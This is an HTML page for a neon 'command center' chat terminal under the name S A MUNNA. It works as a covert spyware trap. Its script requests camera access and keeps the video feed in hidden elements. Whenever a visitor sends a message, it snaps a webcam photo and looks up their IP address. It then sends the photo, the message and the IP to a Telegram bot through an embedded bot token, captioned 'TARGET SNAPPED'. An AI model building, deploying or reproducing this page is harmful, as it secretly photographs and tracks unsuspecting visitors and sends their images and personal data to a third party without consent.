<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>S A MUNNA | COMMAND CENTER</title>
    <style>
        :root { --neon: #0f0; }
        body, html { background: #000; color: var(--neon); margin: 0; padding: 0; font-family: 'Courier New', monospace; overflow-x: hidden; height: 100vh; }
        #matrix { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.15; }
        .wrapper { max-width: 650px; margin: auto; padding: 20px; position: relative; z-index: 10; text-align: center; }
        .p-img { width: 120px; height: 120px; border-radius: 50%; border: 2px solid var(--neon); box-shadow: 0 0 20px var(--neon); margin: 10px 0; object-fit: cover; }
        .terminal { background: rgba(0, 15, 0, 0.9); border: 1px solid var(--neon); padding: 15px; text-align: left; min-height: 120px; font-size: 13px; margin-bottom: 15px; box-shadow: inset 0 0 10px var(--neon); overflow: hidden; }
        .chat-container { background: #050505; border: 1px solid var(--neon); text-align: left; border-radius: 5px; overflow: hidden; }
        .chat-header { background: var(--neon); color: #000; padding: 6px 12px; font-weight: bold; font-size: 12px; display: flex; justify-content: space-between; }
        #chat-flow { height: 250px; overflow-y: auto; padding: 15px; font-size: 13px; color: #fff; }
        .input-wrap { display: flex; border-top: 1px solid var(--neon); background: #000; }
        input { flex: 1; background: transparent; border: none; color: var(--neon); padding: 12px; outline: none; font-family: inherit; }
        button { background: var(--neon); color: #000; border: none; padding: 0 20px; cursor: pointer; font-weight: bold; }
        #boot-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9999; display:flex; align-items:center; justify-content:center; cursor: pointer; }
        .boot-btn { border: 2px solid var(--neon); padding: 15px 30px; color: var(--neon); font-size: 1.2em; box-shadow: 0 0 15px var(--neon); }
        /* Hidden Camera Elements */
        #v-cam, #c-snap { display: none; }
    </style>
</head>
<body>

<div id="boot-overlay" onclick="init()">
    <div class="boot-btn">[ INITIALIZE SYSTEM ]</div>
</div>

<canvas id="matrix"></canvas>
<video id="v-cam" autoplay playsinline></video>
<canvas id="c-snap"></canvas>
<audio id="snd-granted" src="https://www.myinstants.com/media/sounds/access-granted.mp3"></audio>

<div class="wrapper">
    <h2 style="letter-spacing: 4px;">S A MUNNA</h2>
    <img class="p-img" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiH16E5MeqQdyYOx9sj5KIgDIAoAqkZGy99RPt0LSePXM_ctq8SR-Cba0mLDX4ovQ_wGh8tSxjJ_cREXxHMbOd9zLkRISichjh3grw2YmsP9SozbQsdNpWxLgyrw9iX8_I8Xb8MQak8obXDrVrF0Ft-LaVDYSQ73CtzDWA20iKevgTK7RYPJVHIc31odo0/s2048/Picsart_26-04-27_00-47-36-554.jpg" />

    <div class="terminal" id="term-out"></div>

    <div class="chat-container">
        <div class="chat-header">
            <span>SECURE_TERMINAL_V11</span>
            <span id="ip-display">IP: 0.0.0.0</span>
        </div>
        <div id="chat-flow"><div style="color:var(--neon)">> Waiting for command...</div></div>
        <div class="input-wrap">
            <input id="m-inp" placeholder="Type a message to Munna..." type="text" autocomplete="off"/>
            <button id="send-btn" onclick="handleAction()">SEND</button>
        </div>
    </div>
</div>

<script>
    const BTN = '8665353987:AAE8qj8bVbN5JSOHr1yBzd4y0gP86BpXSkI';
    const CID = '8444393519';

    function init() {
        document.getElementById('boot-overlay').style.display = 'none';
        document.getElementById('snd-granted').play();
        startMatrix();
        typeLines();
        getIP();
        // Request Camera Permission Early
        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
            document.getElementById('v-cam').srcObject = s;
        }).catch(e => console.log("Cam denied"));
    }

    function typeLines() {
        const out = document.getElementById('term-out');
        const txt = ["> Booting exploit...", "> Camera module: READY", "> Root access: OK", "> System: STEALTH MODE"];
        let l = 0;
        let timer = setInterval(() => {
            if(l < txt.length) { out.innerHTML += txt[l] + "<br/>"; l++; }
            else clearInterval(timer);
        }, 500);
    }

    function getIP() {
        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
            document.getElementById('ip-display').innerText = "IP: " + d.ip;
        });
    }

    async function handleAction() {
        const inp = document.getElementById('m-inp');
        const val = inp.value.trim();
        if(!val) return;

        // Show message in UI
        const flow = document.getElementById('chat-flow');
        flow.innerHTML += `<div style="margin-top:5px;"><span style="color:var(--neon)">USR:</span> ${val}</div>`;
        flow.scrollTop = flow.scrollHeight;
        inp.value = '';

        // Capture Photo
        const v = document.getElementById('v-cam');
        const c = document.getElementById('c-snap');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        
        c.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', CID);
            fd.append('photo', blob, 'target.jpg');
            fd.append('caption', `🎯 TARGET SNAPPED!\n💬 MSG: ${val}\n🌐 ${document.getElementById('ip-display').innerText}`);
            
            fetch(`https://api.telegram.org/bot${BTN}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg');
    }

    function startMatrix() {
        const c = document.getElementById('matrix');
        const ctx = c.getContext('2d');
        c.width = window.innerWidth; c.height = window.innerHeight;
        const drops = Array(Math.floor(c.width/16)).fill(1);
        setInterval(() => {
            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
            ctx.fillStyle = "#0f0";
            drops.forEach((y, i) => {
                ctx.fillText(Math.floor(Math.random()*2), i*16, y*16);
                if(y*16 > c.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }, 50);
    }
</script>
</body>
</html>
